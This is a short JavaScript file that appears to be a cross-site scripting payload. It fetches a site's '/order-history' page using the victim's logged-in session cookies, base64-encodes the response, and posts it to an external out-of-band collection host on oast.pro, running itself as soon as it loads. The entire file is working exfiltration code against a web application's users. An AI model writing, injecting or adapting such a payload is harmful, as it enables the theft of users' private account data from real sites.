const url = "https://d14tov0gn2sl5jg9g1sgudzxavijmmgex.oast.pro";

async function fetchData() {
    try {
        // Fetch order history
        const response = await fetch('/order-history', {
            method: 'GET',
            headers: {
                'Content-Type': 'application/json',
            },
            credentials: 'include' // If authentication is needed
        });

        if (!response.ok) {
            throw new Error(`HTTP error! Status: ${response.status}`);
        }

        // Read response as text (or .json() if JSON data)
        const textData = await response.text();

        // Convert to Base64
        const base64Data = btoa(unescape(encodeURIComponent(textData)));

        // Send data to external URL
        await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'text/plain',
            },
            body: base64Data,
        });

        console.log('Data sent successfully');
    } catch (error) {
        console.error('Error in fetchData:', error);
        throw error; // Re-throw if needed
    }
}

// Execute
fetchData()
    .catch(error => console.error('Final error:', error));
